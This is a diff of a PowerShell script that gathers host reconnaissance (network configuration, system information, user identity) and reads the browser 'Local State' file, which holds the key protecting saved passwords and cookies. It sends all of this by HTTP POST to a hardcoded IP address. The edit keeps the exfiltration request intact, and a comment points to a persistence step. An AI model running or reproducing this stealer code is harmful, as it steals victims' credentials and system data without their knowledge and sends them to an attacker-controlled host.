@@ -3,7 +3,7 @@
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
-$Header += Get-NetIPConfiguration;Get-ComputerInfo;whoami;Get-Date
+$var += Get-NetIPConfiguration;Get-ComputerInfo;whoami;Get-Date
 
 $var += Get-Content "Local State"
 
@@ -127,7 +127,7 @@ start-sleep 4
 
 #httpsend
 
-$Response = Invoke-WebRequest -Method Post -URI 192.168.2.37:80 -header $Header -body $var -UseBasicParsing
+$Response = Invoke-WebRequest -Method Post -URI 192.168.2.37:80 -body $var -UseBasicParsing
 
 #attempt to set per
 
